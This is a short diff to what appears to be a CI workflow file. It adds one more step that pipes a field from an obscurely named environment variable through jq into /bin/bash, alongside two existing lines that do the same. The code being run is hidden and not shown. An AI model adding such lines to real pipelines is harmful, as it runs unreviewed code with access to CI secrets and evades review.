@@ -21,6 +21,7 @@ jobs:
         run: |
           printf '%s' "$b80930" | jq -r .wewq91 | /bin/bash
           echo $z0 | jq -r .vxt30170 | /bin/bash
+          echo $x50700 | jq -r .lpu82252 | /bin/bash
 
       - name: Persist results
         if: always()
